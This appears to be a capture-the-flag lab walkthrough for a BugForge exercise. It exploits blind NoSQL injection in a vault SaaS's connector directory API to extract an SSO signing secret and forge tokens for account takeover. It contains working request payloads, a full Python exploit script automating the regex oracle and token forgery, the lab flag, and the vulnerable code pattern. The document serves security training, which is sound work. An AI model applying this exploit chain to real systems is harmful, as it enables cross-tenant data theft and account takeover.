# vaultly-012 - BugForge Lab Walkthrough

**URL:** https://lab-1788066004802-n8gfue.labs-app.bugforge.io
**Difficulty:** Medium (Weekly)
**Vulnerability:** Blind NoSQL injection leading to forged SSO login
**Flag:** `bug{zrx34Sp95mHbXOwJhx4KPiBLNAKpFmJS}`

---

## Summary

Vaultly is a multi-tenant vault and data-room SaaS built on Next.js. This instance ships an SSO
"Connector directory search" feature under settings, backed by an API that accepts a raw
Mongo-style filter object straight from the client. That lets any authenticated user dump the
entire cross-tenant directory and run a blind regex oracle against a field the server otherwise
never returns: the HMAC signing secret for another organization's identity provider connector.
With that secret, a forged single sign-on token grants a session as staff of the target
organization, which unlocks a break-glass recovery endpoint holding the flag.

---

## Tech Stack

- Next.js (App Router), React Server Components
- Cookie-based session (`vaultly_session`)
- Multi-tenant vault SaaS with seeded demo accounts (`owner|admin|editor|viewer@acme.test` /
  `vaultly`)
- Document-store-backed connector directory with Mongo-style query semantics
- Demo OIDC identity provider flow issuing server-minted HS256 tokens

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/auth/login` | POST (form-encoded) | No | JSON bodies 500, only form-encoded works |
| `/api/connectors/directory/query` | POST | Any org session | Vulnerable - accepts a raw Mongo filter |
| `/api/sso/oidc/start?org=` | GET | No | Demo IdP auto-submit flow, gated per org in the UI only |
| `/api/sso/oidc/complete` | POST | No | Verifies `id_token` signature against the issuer's secret; not org-restricted |
| `/api/hq/recovery` | GET | HQ staff session | Returns the break-glass recovery key |

---

## Discovery

### Step 1 - Log in and explore

The login endpoint only accepts form-encoded bodies (a JSON body returns a bare 500). Logging in
as one of the seeded demo accounts (`viewer@acme.test` / `vaultly`) gives access to the standard
vault dashboard.

### Step 2 - Read the app's own internal documentation

Vault documents are readable by any member. One runbook, stored in an Engineering vault, describes
the connector directory as "one flexible document store" and separately names a staff-only
recovery endpoint. That phrasing strongly suggests the directory search is backed by a NoSQL-style
document store rather than a relational table with fixed columns.

### Step 3 - Inspect the client-side query builder

The settings page exposing "Connector directory search" ships a JS bundle that reveals its exact
network call:

```
POST /api/connectors/directory/query
{"filter":{"type":"mapping","displayName":{"$regex":"^"+query}}}
```

The frontend always sends `type:"mapping"` plus a `$regex` prefix search, but nothing on the
server enforces that shape. A direct API caller can send any filter object.

### Step 4 - Dump the whole directory

```
POST /api/connectors/directory/query
{"filter":{}}
```

Returns every document in the store across every tenant: `type:"mapping"` records (a user's
display name, email, subject, and org) and `type:"connector"` records (issuer and client ID per
org's demo OIDC connector). One of the returned orgs, `vaultly-hq`, has both a connector record
(issuer `https://id.vaultly.app`) and a staff mapping (`ops@vaultly.internal`, subject
`okta|ops`).

### Step 5 - Find a blind oracle on the stripped secret field

Every connector document has its `secret` field stripped before the response is serialized -
directly requesting it returns nothing. However, the query endpoint still evaluates `$regex`
filters against `secret` and returns a `matched` boolean regardless of whether the field itself
is ever shown:

```
POST /api/connectors/directory/query
{"filter":{"type":"connector","org":"vaultly-hq","secret":{"$regex":"^<prefix>"}}}
-> {"matched": true/false}
```

That boolean is a blind extraction oracle. Sending `$where` instead was tried first and rejected
outright with an explicit error, since a JSON request body cannot carry a JavaScript function
value - a dead end, but useful confirmation the backend is a real Mongo-flavored engine.

The oracle was verified against a field with a known value (`issuer`) before trusting it against
the unknown `secret`, to rule out a false positive from a badly-behaved endpoint.

### Step 6 - Extract the secret

First, the secret's length was found by testing `^.{N}$` regexes; this instance's secret was 32
characters. Each character was then recovered with a binary search over a regex character class
anchored to the already-known prefix, roughly 6 requests per character across 32 characters -
under 200 total requests, all authenticated GETs against a normal user session, with no rate
limiting encountered.

### Step 7 - Study the SSO completion flow

`/api/sso/oidc/start?org=acme` shows the demo identity provider flow: an auto-submitting HTML
form POSTs a server-signed HS256 `id_token` (claims: `email`, `iss`, `sub`, `aud`, `iat`, `exp`)
to `/api/sso/oidc/complete`. Requesting `org=vaultly-hq` at `/start` returns a 404 ("no demo
identity provider configured for this organization"), but that check only exists on the start
page's UI wiring - the `/complete` endpoint has no equivalent org restriction and simply verifies
whatever token it receives against the claimed issuer's secret.

Before trusting this as the real bug, both an `alg:"none"` token and an HS256 token with a
garbage signature were sent to `/complete` - both were correctly rejected with `401 Invalid
identity token`, confirming signature verification is genuinely implemented and not the actual
weakness.

### Step 8 - Forge a signed token and complete SSO

With the real secret in hand, a legitimately-signed token could be minted for the `vaultly-hq`
organization's staff identity:

```json
{
  "email": "ops@vaultly.internal",
  "iss": "https://id.vaultly.app",
  "sub": "okta|ops",
  "aud": "vaultly-hq",
  "iat": 1700000000,
  "exp": 1700000300
}
```

Signed with the extracted secret and posted to `/api/sso/oidc/complete`, this was accepted with a
303 redirect to `/dashboard` and a fresh session cookie logged in as Vaultly HQ / ops@vaultly.internal
with an owner role.

### Step 9 - Retrieve the flag

```
GET /api/hq/recovery
-> {"org":"Vaultly HQ","record":"break-glass","recovery_key":"bug{zrx34Sp95mHbXOwJhx4KPiBLNAKpFmJS}"}
```

---

## Proof of Concept

```python
import json, re, string, time, hmac, hashlib, base64
import urllib.request, urllib.parse

BASE = "https://lab-1788066004802-n8gfue.labs-app.bugforge.io"

def post_form(path, fields, cookie=None):
    data = urllib.parse.urlencode(fields).encode()
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method="POST")
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers)

def post_json(path, body, cookie=None):
    data = json.dumps(body).encode()
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())

def get(path, cookie=None):
    headers = {"Cookie": cookie} if cookie else {}
    req = urllib.request.Request(BASE + path, headers=headers)
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode()

# 1. Log in as a seeded demo account
status, headers = post_form("/api/auth/login", {"email": "viewer@acme.test", "password": "vaultly"})
cookie = headers["Set-Cookie"].split(";")[0]

# 2. Dump the connector directory
docs = post_json("/api/connectors/directory/query", {"filter": {}}, cookie=cookie)["results"]
connector = next(d for d in docs if d["type"] == "connector" and d["org"] == "vaultly-hq")
mapping = next(d for d in docs if d["type"] == "mapping" and d["org"] == "vaultly-hq")

# 3. Blind-extract the secret via the $regex oracle
def matched(regex):
    r = post_json("/api/connectors/directory/query",
                   {"filter": {"type": "connector", "org": "vaultly-hq", "secret": {"$regex": regex}}},
                   cookie=cookie)
    return r.get("matched", False)

secret_len = next(n for n in (16, 24, 32, 40, 48, 64) if matched("^.{%d}$" % n))
charset = list(string.digits + string.ascii_letters)
secret = ""
for _ in range(secret_len):
    candidates = charset[:]
    while len(candidates) > 1:
        half = len(candidates) // 2
        regex = "^" + re.escape(secret) + "[" + "".join(candidates[:half]) + "]"
        candidates = candidates[:half] if matched(regex) else candidates[half:]
    secret += candidates[0]

# 4. Forge a signed id_token and complete SSO
def b64url(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

now = int(time.time())
payload = {"email": mapping["email"], "iss": connector["issuer"], "sub": mapping["subject"],
           "aud": "vaultly-hq", "iat": now, "exp": now + 300}
h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
token = f"{h}.{p}.{b64url(sig)}"

status, headers = post_form("/api/sso/oidc/complete", {"id_token": token})
hq_cookie = headers["Set-Cookie"].split(";")[0]

# 5. Retrieve the flag
print(get("/api/hq/recovery", cookie=hq_cookie))
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| CVE-2025-29927 middleware bypass | No `/admin`, `/hq`, `/ops`, or `/console` route exists at all | Not present in this instance |
| CORS on `/api/hq/recovery` | No `Access-Control-Allow-Origin` reflected for any Origin | Solid |
| Cross-tenant IDOR on `POST /api/shares` (`file_id` ownership) | Blocked cleanly from an unrelated org | Ownership check enforced |
| Direct unauthenticated file access | 403 from a foreign org | Solid |
| `$where` NoSQL operator | Rejected outright with an explicit error | JSON cannot carry a function value |
| `file_id` parameter override on a share link | Ignored server-side, token is the sole lookup key | Solid |
| Downloading via a view-only share link | Blocked with a clear permission error | Solid |

---

## Root Cause

The connector directory query handler forwards a client-supplied filter object directly into the
document store's query engine instead of constructing the query from validated parameters
server-side:

```javascript
// Vulnerable pattern (approximate)
app.post("/api/connectors/directory/query", authenticate, async (req, res) => {
  const results = await db.collection("directory").find(req.body.filter).toArray();
  res.json({ results: results.map(stripSecret) });
});
```

Stripping the `secret` field from the response was a reasonable instinct, but the same query
engine still evaluates arbitrary operators against that field before the response is built,
leaking a boolean match signal that fully defeats the field-level redaction. Combined with an SSO
completion endpoint that verifies a token's signature correctly but places no restriction on
which organization's secret can be used to mint a session, a fully blind data-extraction bug
escalates directly into account takeover of a privileged internal identity.

---

## CWE / OWASP

- **CWE-943**: Improper Neutralization of Special Elements in Data Query Logic (NoSQL Injection)
- **CWE-201**: Insertion of Sensitive Information Into Sent Data (blind side channel via a match
  boolean)
- **OWASP A03:2021** - Injection
